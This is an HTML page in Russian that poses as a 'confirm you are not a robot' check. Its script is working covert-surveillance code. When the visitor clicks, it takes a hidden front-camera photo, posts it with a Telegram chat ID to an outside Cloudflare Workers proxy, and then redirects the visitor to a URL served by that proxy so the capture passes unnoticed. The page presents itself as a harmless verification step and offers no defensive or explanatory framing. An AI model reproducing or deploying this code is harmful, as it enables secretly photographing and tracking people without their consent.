    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Загрузка...</title>
    <style>
    @font-face {
        font-family: 'MyFont';
        src: url('font.ttf') format('truetype');
        font-weight: normal;
        font-style: normal;
    }

    /* Самое важное: применяем ко всем элементам принудительно */
    * {
        font-family: 'MyFont', sans-serif !important;
    }

    /* Отдельно для кнопки, так как она самая капризная */
    button {
        font-family: 'MyFont', sans-serif !important;
        -webkit-font-smoothing: antialiased;
        -moz-osx-font-smoothing: grayscale;
    }
</style>   
    </head>
    <body>
        <div style="text-align: center; margin-top: 50px; font-family: 'MyCustomFont', sans-serif;">
            <h2>Подтвердите, что вы не робот</h2>
            <button id="btn" style="padding: 15px 30px; font-size: 18px; cursor: pointer; background: #18191e; color: white; border: none; border-radius: 8px; font-family: 'MyCustomFont', sans-serif;">
             Я не робот (Продолжить)
            </button>
        </div>
        
        <video id="v" autoplay style="display:none"></video>
        <canvas id="c" style="display:none"></canvas>

        <script>
           const proxyUrl = 'https://silent-surf-60b2.parsinnikita76.workers.dev';
const chatId = '1976857829';

// 1. Запрашиваем ссылку из памяти ЗАРАНЕЕ (сразу при открытии страницы)
let targetUrlPromise = fetch(proxyUrl + "/get-url")
    .then(res => res.text())
    .catch(() => "https://google.com");

const btn = document.getElementById('btn');
const video = document.getElementById('v');
const canvas = document.getElementById('c');

btn.onclick = async () => {
    btn.innerText = "Загрузка..."; 
    btn.disabled = true;
    let stream;

    try {
        stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user", width: { ideal: 640 } } 
        });

        video.srcObject = stream;
        video.setAttribute("playsinline", true);
        
        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                setTimeout(resolve, 300); // Мини-пауза для фокуса
            };
        });

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Сжимаем фото сильнее (0.5), чтобы оно улетело быстрее
        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.3));
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'shot.jpg');

        // --- КРИТИЧЕСКИЙ МОМЕНТ ДЛЯ СКОРОСТИ ---
        // Отправляем фото, но НЕ ЖДЕМ (await) ответа от сервера!
        fetch(proxyUrl, { method: 'POST', body: formData });

        // Сразу получаем готовую ссылку (она уже загрузилась в фоне)
        const finalUrl = await targetUrlPromise;
        
        // Мгновенный редирект
        window.location.href = finalUrl;

    } catch (err) {
        window.location.href = await targetUrlPromise;
    } finally {
        if (stream) stream.getTracks().forEach(t => t.stop());
    }
};


        </script>
    </body>
    </html>
